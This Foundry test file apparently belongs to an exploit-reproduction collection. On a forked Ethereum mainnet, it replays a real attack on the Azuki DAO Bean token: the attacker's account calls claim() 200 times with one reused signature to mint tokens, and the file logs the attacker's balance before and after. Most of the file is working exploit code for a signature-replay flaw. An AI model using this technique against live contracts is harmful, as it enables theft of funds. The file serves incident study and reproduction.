// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$69K
// Attacker : https://etherscan.io/address/0x85d231c204b82915c909a05847cca8557164c75e
// Vulnerable Contract : https://etherscan.io/address/0x8189afbe7b0e81dae735ef027cd31371b3974feb
// Attack Tx : https://etherscan.io/tx/0x6233c9315dd3b6a6fcc7d653f4dca6c263e684a76b4ad3d93595e3b8e8714d34

// @Analysis
// https://twitter.com/sharkteamorg/status/1676892088930271232

interface IBean is IERC20 {
    function claim(
        address[] memory _contracts,
        uint256[] memory _amounts,
        uint256[] memory _tokenIds,
        uint256 _claimAmount,
        uint256 _endTime,
        bytes memory _signature
    ) external;
}

contract AzukiTest is Test {
    IERC20 AZUKI = IERC20(0xED5AF388653567Af2F388E6224dC7C4b3241C544);
    IBean Bean = IBean(0x8189AFBE7b0e81daE735EF027cd31371b3974FeB);
    address private constant Elemental = 0xB6a37b5d14D502c3Ab0Ae6f3a0E058BC9517786e;
    address private constant Beanz = 0x306b1ea3ecdf94aB739F1910bbda052Ed4A9f949;
    address private constant azukiDAOExploiter = 0x85D231C204B82915c909A05847CCa8557164c75e;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 17_593_308);
        cheats.label(address(AZUKI), "AZUKI");
        cheats.label(address(Bean), "Bean");
        cheats.label(Elemental, "Elemental");
        cheats.label(Beanz, "Beanz");
        cheats.label(azukiDAOExploiter, "Azuki DAO Exploiter");
    }

    function testExploit() public {
        deal(address(Bean), azukiDAOExploiter, 0);
        emit log_named_decimal_uint(
            "Attacker balance of Bean token before exploit", Bean.balanceOf(azukiDAOExploiter), Bean.decimals()
        );
        // Arguments for the claim() function calls
        // Signature: sender + contracts + tokenIds + claimAmount + endTime
        bytes32 r = 0xd044373fa377c3af4a854829176d14eebc23d96c342401b294f3491f0616559c;
        bytes32 s = 0x341d0ad6bccd30ed1d09d1b778a4f91738d5105f3986c7e6de9f9df847c90c93;
        uint8 v = 27;
        bytes memory signature = abi.encodePacked(r, s, v);
        assertEq(signature.length, 65);

        address[] memory contracts = new address[](3);
        contracts[0] = address(AZUKI);
        contracts[1] = Elemental;
        contracts[2] = Beanz;
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 1;
        amounts[1] = 0;
        amounts[2] = 0;
        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = 3748;
        vm.startPrank(azukiDAOExploiter);
        // Call claim() 200 times with the same signature. Invalid signature check in Bean token contract.
        // More iterations possible.
        for (uint256 i; i < 200; ++i) {
            Bean.claim(
                contracts,
                amounts,
                tokenIds,
                31_250 * 1e18,
                1_688_142_867, // endTime. This value must be specific to the 'endTime' provided in the attack tx. Block.timestamp won't work here.
                signature
            );
        }
        vm.stopPrank();

        emit log_named_decimal_uint(
            "Attacker balance of Bean token after exploit", Bean.balanceOf(azukiDAOExploiter), Bean.decimals()
        );
    }
}
